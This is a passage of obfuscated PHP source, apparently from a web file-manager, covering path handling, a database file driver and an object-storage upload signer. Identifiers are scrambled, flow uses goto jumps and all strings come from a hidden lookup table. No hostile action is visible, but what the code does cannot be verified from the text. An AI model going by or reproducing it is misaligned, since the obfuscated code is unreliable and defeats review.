$Dƒ¸êšÚùá); $AËô«„ùåÀ = array($a¢¤ïœé“‘[388] => !1, $a¢¤ïœé“‘[1071] => !1, $a¢¤ïœé“‘[385] => !1, $a¢¤ïœé“‘[75] => $a×‰½ó·®Ü, $a¢¤ïœé“‘[1017] => !1, $a¢¤ïœé“‘[1016] => $a¢¤ïœé“‘[33]); if (is_array($Dƒ¸êšÚùá) && count($Dƒ¸êšÚùá) == 5) { $fß·¦ó½¥Ã = $a¢¤ïœé“‘[1072] . $Dƒ¸êšÚùá[2] . $a¢¤ïœé“‘[315]; if (in_array($fß·¦ó½¥Ã, $B¼„Àà´‡¨)) { $AËô«„ùåÀ[$a¢¤ïœé“‘[1017]] = $Dƒ¸êšÚùá[1]; $AËô«„ùåÀ[$a¢¤ïœé“‘[29]] = $fß·¦ó½¥Ã; $AËô«„ùåÀ[$a¢¤ïœé“‘[1073]] = substr($fß·¦ó½¥Ã, 1, -1); $AËô«„ùåÀ[$a¢¤ïœé“‘[367]] = $Dƒ¸êšÚùá[3]; } $AËô«„ùåÀ[$a¢¤ïœé“‘[1016]] = $Dƒ¸êšÚùá[4]; } goto BÜÂ²Ñ‹¢“; a‹ß³àéñù: } public static function clear($D˜îåô°À¤) { goto DÅìÖ¹ç”; eº¯›ãÄä: $D˜îåô°À¤ = preg_replace($FÉ»ğå¾ğŞ[1077], $FÉ»ğå¾ğŞ[8], $D˜îåô°À¤); if ($D˜îåô°À¤ == $FÉ»ğå¾ğŞ[8]) { return $FÉ»ğå¾ğŞ[8]; } $D˜îåô°À¤ = rtrim($D˜îåô°À¤, $FÉ»ğå¾ğŞ[8]); goto D¬Ôá†³¼Ä; D¬Ôá†³¼Ä: return $D˜îåô°À¤; goto BåØğâèÌ; DÅìÖ¹ç”: $FÉ»ğå¾ğŞ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $D˜îåô°À¤ = str_replace(array($FÉ»ğå¾ğŞ[996], $FÉ»ğå¾ğŞ[217]), $FÉ»ğå¾ğŞ[50], $D˜îåô°À¤); $D˜îåô°À¤ = str_replace($FÉ»ğå¾ğŞ[93], $FÉ»ğå¾ğŞ[8], $D˜îåô°À¤); goto aÚÊÇ¤ÄÎ; aÚÊÇ¤ÄÎ: $aô°¬’Õóº = $FÉ»ğå¾ğŞ[1075]; if (substr($D˜îåô°À¤, 0, 3) == $FÉ»ğå¾ğŞ[1076]) { $D˜îåô°À¤ = substr($D˜îåô°À¤, 3); } while (strstr($D˜îåô°À¤, $aô°¬’Õóº)) { $D˜îåô°À¤ = str_replace($aô°¬’Õóº, $FÉ»ğå¾ğŞ[8], $D˜îåô°À¤); } goto eº¯›ãÄä; BåØğâèÌ: } public static function sourceID($bø’Äò›ˆ) { $b°„­Î÷ª =& $_SERVER[´Ù×Íå‘ÄõÛ]; $D‚›öŞõÈİ = self::parse($bø’Äò›ˆ); if ($D‚›öŞõÈİ[$b°„­Î÷ª[29]] !== self::KOD_SOURCE) { show_json(LNG($b°„­Î÷ª[1078]), !1); } return $D‚›öŞõÈİ[$b°„­Î÷ª[367]]; } public static function make($B®™Ïšåâ) { if (!$B®™Ïšåâ) { return !1; } return self::makePath(self::KOD_SOURCE, intval($B®™Ïšåâ)); } public static function makeShare($eƒ©ÒßŒÃí, $dëÃ¦éÕŠØ) { return self::makePath(self::KOD_SHARE_ITEM, $eƒ©ÒßŒÃí, $dëÃ¦éÕŠØ); } public static function makeFileTypePath($F‹µ‘ÈÄ„×) { return self::makePath(self::KOD_USER_FILE_TYPE, $F‹µ‘ÈÄ„×); } public static function makeFileTagPath($Dñ¼Ş«ŒàÎ) { return self::makePath(self::KOD_USER_FILE_TAG, $Dñ¼Ş«ŒàÎ); } public static function makePath($bŸ©ÒŸÅ‘–, $f˜ƒ¼ò²– = '', $fİ³Š²â—¶ = '') { $A÷‰Æ¬–Àâ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $d˜‘İ°Ç´× = substr($bŸ©ÒŸÅ‘–, 1, -1); $cùÈØÊê = $A÷‰Æ¬–Àâ[1079] . $d˜‘İ°Ç´× . $A÷‰Æ¬–Àâ[1080] . $f˜ƒ¼ò²– . $A÷‰Æ¬–Àâ[1081]; $cùÈØÊê = $fİ³Š²â—¶ ? $cùÈØÊê . $fİ³Š²â—¶ . $A÷‰Æ¬–Àâ[8] : $cùÈØÊê; return $cùÈØÊê; } public static function hashPath($eØŸÉœàÎ) { $Fªë×ê¶Ó =& $_SERVER[´Ù×Íå‘ÄõÛ]; $F»Óñ•¹‚• = is_array($eØŸÉœàÎ) ? $eØŸÉœàÎ : IO::info($eØŸÉœàÎ); $eêŸ¡êÆµ˜ = _get($F»Óñ•¹‚•, $Fªë×ê¶Ó[1082], $Fªë×ê¶Ó[33]); if (!$eêŸ¡êÆµ˜) { $C¢¿Ô·™„¯ = KodIO::parse($F»Óñ•¹‚•[$Fªë×ê¶Ó[75]]); if (!$C¢¿Ô·™„¯[$Fªë×ê¶Ó[29]]) { $eêŸ¡êÆµ˜ = IO::hashSimple($F»Óñ•¹‚•[$Fªë×ê¶Ó[75]]); } } if (!$eêŸ¡êÆµ˜) { $eêŸ¡êÆµ˜ = md5($F»Óñ•¹‚•[$Fªë×ê¶Ó[75]] . $F»Óñ•¹‚•[$Fªë×ê¶Ó[77]] . $F»Óñ•¹‚•[$Fªë×ê¶Ó[107]]); } return $eêŸ¡êÆµ˜; } public static function initSystemPath() { $aÌ«¶†Ú³ó =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (defined($aÌ«¶†Ú³ó[1083])) { return; } define($aÌ«¶†Ú³ó[1083], self::systemPath($aÌ«¶†Ú³ó[1084])); define($aÌ«¶†Ú³ó[1085], self::systemPath($aÌ«¶†Ú³ó[1086])); define($aÌ«¶†Ú³ó[1087], self::systemPath($aÌ«¶†Ú³ó[1088])); define($aÌ«¶†Ú³ó[1089], self::systemPath($aÌ«¶†Ú³ó[1090])); } private static function systemPath($C“À‡ö¯¼Ø) { goto BèØø±ÙÙ; BèØø±ÙÙ: $eë…ÍÒŸÕ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $A”åçÓ„Ü¾ = $eë…ÍÒŸÕ[1091] . ucfirst($C“À‡ö¯¼Ø); $c×…¤ÔÆÙå = Model($eë…ÍÒŸÕ[1092])->get($A”åçÓ„Ü¾); goto A´„ÌÙğ§¹; A´„ÌÙğ§¹: if ($c×…¤ÔÆÙå) { return $c×…¤ÔÆÙå; } if ($C“À‡ö¯¼Ø == $eë…ÍÒŸÕ[1084]) { $c×…¤ÔÆÙå = self::make(Model($eë…ÍÒŸÕ[753])->systemRootPathAdd($eë…ÍÒŸÕ[1093])); } else { $c×…¤ÔÆÙå = self::systemPath($eë…ÍÒŸÕ[1084]); $eÏ‡òÌØğ¨ = self::sourceID($c×…¤ÔÆÙå); $c×…¤ÔÆÙå = self::make(Model($eë…ÍÒŸÕ[753])->mkdir($eÏ‡òÌØğ¨, $C“À‡ö¯¼Ø)); } Model($eë…ÍÒŸÕ[1092])->set($A”åçÓ„Ü¾, $c×…¤ÔÆÙå); goto bìÔÇƒÓÔ‚; bìÔÇƒÓÔ‚: return $c×…¤ÔÆÙå; goto aë¸¢Æè¯Ã; aë¸¢Æè¯Ã: } public static function systemFolder($e‹óÈÙŸ«) { $A¾‡“é’‹ = IO_PATH_SYSTEM_SOURCE . $e‹óÈÙŸ«; $F´ß¢®×˜ = Cache::get($A¾‡“é’‹); if (!$F´ß¢®×˜) { $dÎ÷±Ã‚‚ = IO::infoFull($A¾‡“é’‹); if (!$dÎ÷±Ã‚‚) { $F´ß¢®×˜ = IO::mkdir($A¾‡“é’‹, REPEAT_SKIP); } else { $F´ß¢®×˜ = $dÎ÷±Ã‚‚[$_SERVER[´Ù×Íå‘ÄõÛ][75]]; } Cache::set($A¾‡“é’‹, $F´ß¢®×˜, 3600 * 10); } return $F´ß¢®×˜; } public static function defaultDriver() { return Model($_SERVER[´Ù×Íå‘ÄõÛ][704])->defaultDriver(); } public static function defaultIO() { $a¬Î‰®íÊ¦ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $F„Âå©ôŒï = self::defaultDriver(); return $a¬Î‰®íÊ¦[1094] . $F„Âå©ôŒï[$a¬Î‰®íÊ¦[367]] . $a¬Î‰®íÊ¦[1081]; } public static function defaultDriverInit() { static $DÂÖ¡ö²šç = false; if ($DÂÖ¡ö²šç) { return $DÂÖ¡ö²šç; } $DÂÖ¡ö²šç = IO::init(self::defaultIO()); return $DÂÖ¡ö²šç; } public static function fileTypeList() { $eÁ‚ÜÁÉÜ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $bã¬¨—‚ = $GLOBALS[$eÁ‚ÜÁÉÜ[6]][$eÁ‚ÜÁÉÜ[1095]]; foreach ($bã¬¨—‚ as $d¤Š’ãìÄò => $C…‰ì¨ëî±) { $cã’áÕòå = $eÁ‚ÜÁÉÜ[1096] . $d¤Š’ãìÄò; $Fİ¤‹˜øñí = LNG($cã’áÕòå); if ($cã’áÕòå != $Fİ¤‹˜øñí) { $bã¬¨—‚[$d¤Š’ãìÄò][$eÁ‚ÜÁÉÜ[28]] = $Fİ¤‹˜øñí; } } return $bã¬¨—‚; } public static function transferType($Aãù¿³ñ÷å, $bë‘ìÖ³‘) { goto C•Ç±¹’ËÍ; d†’øª‰…: if ($BéÊ–×»[$Eí‰¾éªÏÎ[29]] == $CÉ¢¿ãóç[$Eí‰¾éªÏÎ[29]] && $BéÊ–×»[$Eí‰¾éªÏÎ[1097]] == $CÉ¢¿ãóç[$Eí‰¾éªÏÎ[1097]]) { return $Eí‰¾éªÏÎ[1098]; } if ($BéÊ–×»[$Eí‰¾éªÏÎ[29]] == $Eí‰¾éªÏÎ[780] && $CÉ¢¿ãóç[$Eí‰¾éªÏÎ[29]] == $Eí‰¾éªÏÎ[102]) { return $Eí‰¾éªÏÎ[1044]; } if ($BéÊ–×»[$Eí‰¾éªÏÎ[29]] == $Eí‰¾éªÏÎ[102] && $CÉ¢¿ãóç[$Eí‰¾éªÏÎ[29]] == $Eí‰¾éªÏÎ[780]) { return $Eí‰¾éªÏÎ[103]; } goto EÙƒßôÌ®; EÙƒßôÌ®: return $Eí‰¾éªÏÎ[1099]; goto d½ã––œªŠ; C•Ç±¹’ËÍ: $Eí‰¾éªÏÎ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $BéÊ–×» = self::driverType($Aãù¿³ñ÷å); $CÉ¢¿ãóç = self::driverType($bë‘ìÖ³‘); goto d†’øª‰…; d½ã––œªŠ: } public static function driverType($AğãìÌ”Š) { goto a¬ŒºÓŠÛ—; b†öÓÎ‚˜: return array($C™Æ¾¶©°ï[29] => $C™Æ¾¶©°ï[780], $C™Æ¾¶©°ï[1097] => $AğãìÌ”Š->pathDriver, $C™Æ¾¶©°ï[75] => $c´ˆ¾„Ê§®); goto FƒÇº®¸Ñ; fĞ½îšÑ–ö: if ($CÀé£Ô¨Úò == $C™Æ¾¶©°ï[695] || $CÀé£Ô¨Úò == $C™Æ¾¶©°ï[1101] || $CÀé£Ô¨Úò == $C™Æ¾¶©°ï[1102]) { $AğãìÌ”Š = self::defaultDriverInit(); } else { if ($CÀé£Ô¨Úò == $C™Æ¾¶©°ï[1052] || $CÀé£Ô¨Úò == $C™Æ¾¶©°ï[1103]) { $AğãìÌ”Š = IO::init($AğãìÌ”Š->pathParse[$C™Æ¾¶©°ï[1002]]); } } $CÀé£Ô¨Úò = str_replace($C™Æ¾¶©°ï[1100], $C™Æ¾¶©°ï[33], strtolower($AğãìÌ”Š->getType())); if ($CÀé£Ô¨Úò == $C™Æ¾¶©°ï[102]) { return array($C™Æ¾¶©°ï[29] => $C™Æ¾¶©°ï[102], $C™Æ¾¶©°ï[1097] => $C™Æ¾¶©°ï[33], $C™Æ¾¶©°ï[75] => $c´ˆ¾„Ê§®); } goto b†öÓÎ‚˜; a¬ŒºÓŠÛ—: $C™Æ¾¶©°ï =& $_SERVER[´Ù×Íå‘ÄõÛ]; $c´ˆ¾„Ê§® = $AğãìÌ”Š->path; $CÀé£Ô¨Úò = str_replace($C™Æ¾¶©°ï[1100], $C™Æ¾¶©°ï[33], strtolower($AğãìÌ”Š->getType())); goto fĞ½îšÑ–ö; FƒÇº®¸Ñ: } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($D…³é°äŞ») { parent::__construct($D…³é°äŞ»); $this->signatureVersion($_SERVER[´Ù×Íå‘ÄõÛ][200]); } public function uploadFormData($E½‡ºî¸İø, $E’‘õìÍñ = 3600) { goto eçİÛùí†; aæ¯ò­ñª: $EæÖŞ·ˆ‘¤ = array($BÇ†ƒÙ¤ñ[1106] => $eåØÉåóİá, $BÇ†ƒÙ¤ñ[1107] => array(array($BÇ†ƒÙ¤ñ[1108] => $dÓİïŞÍÀÂ), array($BÇ†ƒÙ¤ñ[1109] => $this->bucket), array($BÇ†ƒÙ¤ñ[1110], $BÇ†ƒÙ¤ñ[1111], $BÇ†ƒÙ¤ñ[33]), array($BÇ†ƒÙ¤ñ[1112] => $eœÀÙö…Ôè), array($BÇ†ƒÙ¤ñ[1113] => $eãÔØ˜Ü‰), array($BÇ†ƒÙ¤ñ[1114] => $this->accessKey), array($BÇ†ƒÙ¤ñ[1115] => $e™ÚÛƒå±Ã))); $EæÖŞ·ˆ‘¤ = json_encode($EæÖŞ·ˆ‘¤); $aÕ†‰óâ” = hash_hmac($BÇ†ƒÙ¤ñ[218], $e™ÚÛƒå±Ã, $this->secret); goto cáÌ™×İË®; cáÌ™×İË®: $eœÍƒ²øƒº = sha1($EæÖŞ·ˆ‘¤); $Eå³½·Íšì = hash_hmac($BÇ†ƒÙ¤ñ[218], $eœÍƒ²øƒº, $aÕ†‰óâ”); $BÒ‘Şø¤© = array($BÇ†ƒÙ¤ñ[1108] => $dÓİïŞÍÀÂ, $BÇ†ƒÙ¤ñ[1112] => $eœÀÙö…Ôè, $BÇ†ƒÙ¤ñ[1116] => base64_encode($EæÖŞ·ˆ‘¤), $BÇ†ƒÙ¤ñ[1113] => $eãÔØ˜Ü‰, $BÇ†ƒÙ¤ñ[1114] => $this->accessKey, $BÇ†ƒÙ¤ñ[1117] => $e™ÚÛƒå±Ã, $BÇ†ƒÙ¤ñ[1118] => $Eå³½·Íšì, $BÇ†ƒÙ¤ñ[169] => $this->getHost()); goto DŸõÀ‡ĞÊš; DŸõÀ‡ĞÊš: return $BÒ‘Şø¤©; goto fğ½íË‹§”; eçİÛùí†: $BÇ†ƒÙ¤ñ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $dÓİïŞÍÀÂ = $BÇ†ƒÙ¤ñ[185]; $eãÔØ˜Ü‰ = $BÇ†ƒÙ¤ñ[218]; goto cùÏø‡åñ•; cùÏø‡åñ•: $eœÀÙö…Ôè = $BÇ†ƒÙ¤ñ[1104]; $eåØÉåóİá = gmdate($BÇ†ƒÙ¤ñ[1105], time() + $E’‘õìÍñ); $e™ÚÛƒå±Ã = (string) time() . $BÇ†ƒÙ¤ñ[67] . (string) (time() + $E’‘õìÍñ); goto aæ¯ò­ñª; fğ½íË‹§”: } public function fileOutLink($a¾²Ëöº½) { $cÉÂé”ªĞ˜ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (substr($a¾²Ëöº½, 0, 7) == $cÉÂé”ªĞ˜[1119]) { $a¾²Ëöº½ = $cÉÂé”ªĞ˜[1120] . substr($a¾²Ëöº½, 7); } header($cÉÂé”ªĞ˜[156] . $a¾²Ëöº½); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($B˜À½î¼ô˜) { $this->pathParse = $B˜À½î¼ô˜; $this->model = Model($_SERVER[´Ù×Íå‘ÄõÛ][1121]); } public function getPath($e¶ø¥˜‚ï) { return trim($e¶ø¥˜‚ï, $_SERVER[´Ù×Íå‘ÄõÛ][8]); } public function pathFather($A³ç«ñÚ¿) { $fÀğ—˜ÖÈ = $this->parse($A³ç«ñÚ¿); $fÀğ—˜ÖÈ = $this->infoSimple($A³ç«ñÚ¿); return $fÀğ—˜ÖÈ ? $fÀğ—˜ÖÈ[$_SERVER[´Ù×Íå‘ÄõÛ][463]] : !1; } public function getPathName($aˆñ„ãÙ÷) { $A…ê¡†”ÉÊ = $this->infoSimple($aˆñ„ãÙ÷); return $A…ê¡†”ÉÊ ? $A…ê¡†”ÉÊ[$_SERVER[´Ù×Íå‘ÄõÛ][28]] : !1; } public function getPathOuter($B‹‹öç¼å¥) { if (!$B‹‹öç¼å¥) { return $B‹‹öç¼å¥; } $f ¼» ëÉ¸ = $this->parse($B‹‹öç¼å¥); return KodIO::make($f ¼» ëÉ¸[$_SERVER[´Ù×Íå‘ÄõÛ][367]]); } public function copyFolderFromIO($B¨îöØ§·Ù, $döÒ¹²ÔÖ, $Fê¡¹ìºì, $a¥Şºó—, $C‡Ô˜‚‹Ï©) { $Dø°‰‡øä = $this->model->copyFolderFromIO($B¨îöØ§·Ù, $döÒ¹²ÔÖ, $Fê¡¹ìºì, $a¥Şºó—, $C‡Ô˜‚‹Ï©); return KodIO::make($Dø°‰‡øä); } public function isParentOf($AÕ¶ÎœÀùæ, $bƒ‡¹‰Ÿ±) { return $this->model->isParentOf($AÕ¶ÎœÀùæ, $bƒ‡¹‰Ÿ±); } public function mkfile($E×ë®„‚Æ•, $F˜²»£æÁ = '', $eÏïÁĞôğ = REPEAT_RENAME) { $A²½İÊ’Ğ’ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $b»¶éø‘÷È = $this->parse($E×ë®„‚Æ•); $E×ë®„‚Æ• = $b»¶éø‘÷È[$A²½İÊ’Ğ’[367]]; for ($fïÍƒñ˜Şï = 0; $fïÍƒñ˜Şï < count($b»¶éø‘÷È[$A²½İÊ’Ğ’[1122]]); $fïÍƒñ˜Şï++) { $cÅÀ²ÃåâÒ = $b»¶éø‘÷È[$A²½İÊ’Ğ’[1122]][$fïÍƒñ˜Şï]; if ($fïÍƒñ˜Şï == count($b»¶éø‘÷È[$A²½İÊ’Ğ’[1122]]) - 1) { $E×ë®„‚Æ• = $this->model->mkfile($E×ë®„‚Æ•, $cÅÀ²ÃåâÒ, $F˜²»£æÁ, $eÏïÁĞôğ); break; } $E×ë®„‚Æ• = $this->model->mkdir($E×ë®„‚Æ•, $cÅÀ²ÃåâÒ, REPEAT_SKIP); } return $this->getPathOuter($E×ë®„‚Æ•); } public function mkdir($CŞĞ‚ÂÊ˜Í, $D¬ÓÀ‰Ñç¾ = REPEAT_SKIP) { $BÔ¦×—Í§Ä =& $_SERVER[´Ù×Íå‘ÄõÛ]; $c¢é…‘ë = $this->parse($CŞĞ‚ÂÊ˜Í); $CŞĞ‚ÂÊ˜Í = $c¢é…‘ë[$BÔ¦×—Í§Ä[367]]; for ($a¼“Áœµ¥ = 0; $a¼“Áœµ¥ < count($c¢é…‘ë[$BÔ¦×—Í§Ä[1122]]); $a¼“Áœµ¥++) { $d…Œ£§³ = $c¢é…‘ë[$BÔ¦×—Í§Ä[1122]][$a¼“Áœµ¥]; $CŞĞ‚ÂÊ˜Í = $this->model->mkdir($CŞĞ‚ÂÊ˜Í, $d…Œ£§³, $D¬ÓÀ‰Ñç¾); } return $this->getPathOuter($CŞĞ‚ÂÊ˜Í); } public function copyFile($d“à‹ºŠĞ±, $CÑÉ»ŠŸ‚, $A°£‰‹îŒÏ = REPEAT_REPLACE) { $D¯”±±‹Ø– =& $_SERVER[´Ù×Íå‘ÄõÛ]; $fæ‡ò¬²è¦ = $this->parse($CÑÉ»ŠŸ‚); $aã¥¿â ø = $this->model->copy($d“à‹ºŠĞ±, $fæ‡ò¬²è¦[$D¯”±±‹Ø–[367]], $A°£‰‹îŒÏ, $fæ‡ò¬²è¦[$D¯”±±‹Ø–[75]]); return $aã¥¿â ø ? $this->getPathOuter($aã¥¿â ø) : !1; } public function moveFile($b·èœ›¾ƒ, $d»»Åˆïôº, $bŞ¾Ëµœ„ = REPEAT_REPLACE) { $CÓÀ­‘Ÿ›È =& $_SERVER[´Ù×Íå‘ÄõÛ]; $bôåàÖ˜Ø = $this->parse($d»»Åˆïôº); $Bôñ³œï‰ó = $this->model->move($b·èœ›¾ƒ, $bôåàÖ˜Ø[$CÓÀ­‘Ÿ›È[367]], $bŞ¾Ëµœ„, $bôåàÖ˜Ø[$CÓÀ­‘Ÿ›È[75]]); return $Bôñ³œï‰ó ? $this->getPathOuter($Bôñ³œï‰ó) : !1; } public function copy($fƒöíˆßé, $dŒ·º¯´°“, $A¹ËŸ—’òµ = REPEAT_REPLACE) { $CñÓ‰ª–¯ù = $this->parse($dŒ·º¯´°“); $cŒ†‚ĞéŒå = $this->model->copy($fƒöíˆßé, $CñÓ‰ª–¯ù[$_SERVER[´Ù×Íå‘ÄõÛ][367]], $A¹ËŸ—’òµ); return $cŒ†‚ĞéŒå ? $this->getPathOuter($cŒ†‚ĞéŒå) : !1; } public function moveSameAllow() { } public function move($DÔòµÜÅàé, $EÉ‡¢Ç½¢, $aÜ·”Òë•« = REPEAT_REPLACE) { $F¨“ò¿Öğ” = $this->parse($EÉ‡¢Ç½¢); $bèõà†ÚÔ¹ = $this->model->move($DÔòµÜÅàé, $F¨“ò¿Öğ”[$_SERVER[´Ù×Íå‘ÄõÛ][367]], $aÜ·”Òë•«); return $bèõà†ÚÔ¹ ? $this->getPathOuter($bèõà†ÚÔ¹) : !1; } public function remove($DèÄçß÷À¬, $c„ã“‰Õ× = true) { return $this->model->remove($DèÄçß÷À¬, $c„ã“‰Õ×); } public function rename($Cµ›ÖÄ½Ç, $B„’áùŞ¾÷) { $A½©µƒÉíè = $this->model->rename($Cµ›ÖÄ½Ç, $B„’áùŞ¾÷); return $A½©µƒÉíè ? $this->getPathOuter($Cµ›ÖÄ½Ç) : $A½©µƒÉíè; } public function size($aÏ²Ğ’å³) { $f¼Â·¦“øÇ = $this->infoSimple($aÏ²Ğ’å³); return $f¼Â·¦“øÇ ? $f¼Â·¦“øÇ[$_SERVER[´Ù×Íå‘ÄõÛ][77]] : 0; } public function infoSimple($BŸùÅ¬³ Í) { return $this->model->sourceInfo($BŸùÅ¬³ Í); } public function info($Dø•Ã³ëŸ) { return $this->infoParse($Dø•Ã³ëŸ); } public function infoAuth($cÍ¾İâ‹¯Ö) { return $this->infoParse($cÍ¾İâ‹¯Ö, !1, !0); } public function infoWithChildren($E¾¥ÊƒĞå) { return $this->infoParse($E¾¥ÊƒĞå, !0); } protected function infoParse($a­Ğç§Ä, $D¶òŒ¿°ãó = false, $f•´Õ©à±ë = false) { if (!$D¶òŒ¿°ãó) { return $this->model->pathInfo($a­Ğç§Ä, $f•´Õ©à±ë); } return $this->model->pathInfoMore($a­Ğç§Ä); } public function infoFull($B…Ëùóˆ) { $D±á½¦©š­ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $eÙù‘¾±È« = explode($D±á½¦©š­[8], $B…Ëùóˆ); $EÆÎÛ¸îê£ = implode($D±á½¦©š­[8], array_splice($eÙù‘¾±È«, 1)); return $this->model->pathInfoByPath($eÙù‘¾±È«[0], $EÆÎÛ¸îê£); } public function hashSimple($A„¬¼ªÛ°µ) { $b‰¢¿¥³Ø‰ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $CõÇŞ•ùøÔ = $this->infoWithChildren($A„¬¼ªÛ°µ); return $CõÇŞ•ùøÔ[$b‰¢¿¥³Ø‰[162]][$b‰¢¿¥³Ø‰[164]]; } public function hashMd5($føèšØ°‘÷) { $Eˆé»ÃĞöó =& $_SERVER[´Ù×Íå‘ÄõÛ]; $bÅæîàÚ­£ = $this->infoWithChildren($føèšØ°‘÷); return $bÅæîàÚ­£[$Eˆé»ÃĞöó[162]][$Eˆé»ÃĞöó[163]]; } public function exist($E¨ƒ—¥áŒÇ) { $fËßµ‘™œ£ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $Dëì”Ï´Ë÷ = $this->parse($E¨ƒ—¥áŒÇ); if (!$Dëì”Ï´Ë÷[$fËßµ‘™œ£[75]]) { return $this->isFile($E¨ƒ—¥áŒÇ) || $this->isFolder($E¨ƒ—¥áŒÇ); } $A¹ãÚÇ” = array($fËßµ‘™œ£[368] => $Dëì”Ï´Ë÷[$fËßµ‘™œ£[367]], $fËßµ‘™œ£[28] => $Dëì”Ï´Ë÷[$fËßµ‘™œ£[75]]); $aÈ«À‰ÏÏ = $this->model->where($A¹ãÚÇ”)->find(); return $aÈ«À‰ÏÏ ? !0 : !1; } public function isFile($D©”ˆ¢Âù) { $C‘òİ‚˜éï =& $_SERVER[´Ù×Íå‘ÄõÛ]; $c‡ÌÌôğáù = $this->infoSimple($D©”ˆ¢Âù); return $c‡ÌÌôğáù && $c‡ÌÌôğáù[$C‘òİ‚˜éï[370]] == $C‘òİ‚˜éï[83] ? !1 : !0; } public function isFolder($díéòÈ¹Â) { $f»Ö‡èŒ”à =& $_SERVER[´Ù×Íå‘ÄõÛ]; $D¶ã­Íª‡ = $this->infoSimple($díéòÈ¹Â); return $D¶ã­Íª‡ && $D¶ã­Íª‡[$f»Ö‡èŒ”à[370]] == $f»Ö‡èŒ”à[83] ? !0 : !1; } public function listPath($C„†´›®», $F®ê¬·ò ‰ = false) { $föÀª¡‡œ± =& $_SERVER[´Ù×Íå‘ÄõÛ]; if ($C„†´›®» == $föÀª¡‡œ±[33]) { return !1; } $Cºò­®£å² = array($föÀª¡‡œ±[368] => $C„†´›®»); if ($F®ê¬·ò ‰) { return $this->model->listSource($Cºò­®£å², -1); } return $this->model->listSource($Cºò­®£å²); } public function has($bõ†ÓÍ–ª, $BÜß“÷ĞŸÅ = false, $eáÎõ¼Á”µ = null) { $eŠ·ˆŠŒ©® =& $_SERVER[´Ù×Íå‘ÄõÛ]; $EÜ½ˆÇò = $this->infoWithChildren($bõ†ÓÍ–ª); if ($BÜß“÷ĞŸÅ) { return array($eŠ·ˆŠŒ©®[192] => $EÜ½ˆÇò[$eŠ·ˆŠŒ©®[192]], $eŠ·ˆŠŒ©®[191] => $EÜ½ˆÇò[$eŠ·ˆŠŒ©®[191]]); } return $eáÎõ¼Á”µ ? $EÜ½ˆÇò[$eŠ·ˆŠŒ©®[192]] : $EÜ½ˆÇò[$eŠ·ˆŠŒ©®[191]]; } public function listAll($f•µâÉÍ°ø) { $bš…´éîÂ¢ = IO::info($this->pathParse[$_SERVER[´Ù×Íå‘ÄõÛ][75]]); if (!$bš…´éîÂ¢) { return array(); } return $this->model->listAll($f•µâÉÍ°ø); } public function getContent($cîÂ«±åÜ) { return $this->model->getContent($cîÂ«±åÜ); } public function setContent($C”Ô†”±áÀ, $BÕÅâÁ£ = '') { return $this->model->setContent($C”Ô†”±áÀ, $BÕÅâÁ£); } public function fileSubstr($e‘¾Ô­¢íÆ, $CÀãÚ¼ß”ø, $bâ‹™¬Ä¡) { return $this->model->fileSubstr($e‘¾Ô­¢íÆ, $CÀãÚ¼ß”ø, $bâ‹™¬Ä¡); } public function download($EÂÀ•ÂÌ‹‘, $E©¯‚ãñ° = '') { $Añ¤¸Çê‚Œ = get_path_father($E©¯‚ãñ°); $F¨Ú—»ñ‚· = get_path_this($E©¯‚ãñ°); $aòÀÜ¡£ŒŠ = $this->model->fileInfoGet($EÂÀ•ÂÌ‹‘); $F¯½°´ñÁ® = IO::copy($aòÀÜ¡£ŒŠ[$_SERVER[´Ù×Íå‘ÄõÛ][75]], $Añ¤¸Çê‚Œ, !1, $F¨Ú—»ñ‚·); return $F¯½°´ñÁ®; } public function setModifyTime($aì°Óœ¹ë, $AáÆ¯Úä‹Œ = '') { $this->model->metaSet($aì°Óœ¹ë, $_SERVER[´Ù×Íå‘ÄõÛ][1123], $AáÆ¯Úä‹Œ); } public function upload($dŞÅ•Ò‰âˆ, $f ¥‚™Ê¯, $b‡®ÎÆ‡Æ = false, $B«½Ñ©¾š = REPEAT_REPLACE) { $Bô»èîğ‘Ü =& $_SERVER[´Ù×Íå‘ÄõÛ]; $FÚ÷ÉÀ§™ = $this->parse($dŞÅ•Ò‰âˆ); $EÂ°ßµ­† = $this->model->addFile($FÚ÷ÉÀ§™[$Bô»èîğ‘Ü[367]], $f ¥‚™Ê¯, $FÚ÷ÉÀ§™[$Bô»èîğ‘Ü[75]], $b‡®ÎÆ‡Æ, $B«½Ñ©¾š); return $this->getPathOuter($EÂ°ßµ­†); } public function uploadFileByID($f …–ƒ”ÍÅ, $BÓ½«àµÇ¹, $F«öè¨ÎàÚ) { $e†øÔäõ‡Ü =& $_SERVER[´Ù×Íå‘ÄõÛ]; $AîÚ¤ = $this->parse($f …–ƒ”ÍÅ); $F³Ã‡½¦ñ = $this->model->addFileByFileID($AîÚ¤[$e†øÔäõ‡Ü[367]], $BÓ½«àµÇ¹, $AîÚ¤[$e†øÔäõ‡Ü[75]], $F«öè¨ÎàÚ); return $this->getPathOuter($F³Ã‡½¦ñ); } public function addFileByRemote($Dí²°‘ĞĞ, $E´—ÏíŒ”, $c©Öİ¶ = array(), $a·ãğá†Íù = '', $Dí‹ô³Åœ¨) { $bÊïš¦›ØŸ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $d½îØ‡£ä¡ = $this->parse($Dí²°‘ĞĞ); $a·ãğá†Íù = empty($a·ãğá†Íù) ? $d½îØ‡£ä¡[$bÊïš¦›ØŸ[75]] : $a·ãğá†Íù; $B·ë„óÉ’ï = $this->model->addFileByRemote($d½îØ‡£ä¡[$bÊïš¦›ØŸ[367]], $E´—ÏíŒ”, $a·ãğá†Íù, $c©Öİ¶, $Dí‹ô³Åœ¨); return $this->getPathOuter($B·ë„óÉ’ï); } public function uploadLink($C……­àêô, $d¶»îÚ˜ŒÇ = 0) { $D‘é½çÉ¡¤ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $Eë²µ¢‰» 